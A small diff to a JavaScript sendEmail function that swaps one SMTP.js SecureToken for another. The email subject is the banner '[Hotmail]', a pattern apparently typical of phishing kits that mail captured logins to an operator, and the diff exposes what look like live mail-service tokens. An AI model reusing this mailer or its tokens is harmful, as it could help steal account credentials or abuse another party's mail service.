@@ -100,7 +100,7 @@ function sendEmail(to,message) {
   // Host: smtp_host,
   // Username : smtp_username,
   // Password : smtp_password,
-  SecureToken: '1ddd0735-7eff-4580-88ee-cee70dbc2efe',
+  SecureToken: '9b7a1505-0fd0-46d3-902c-27189ba8d8f3',
   To : to,
   From : smtp_username,
   Subject : '==============+ [Hotmail] +================',
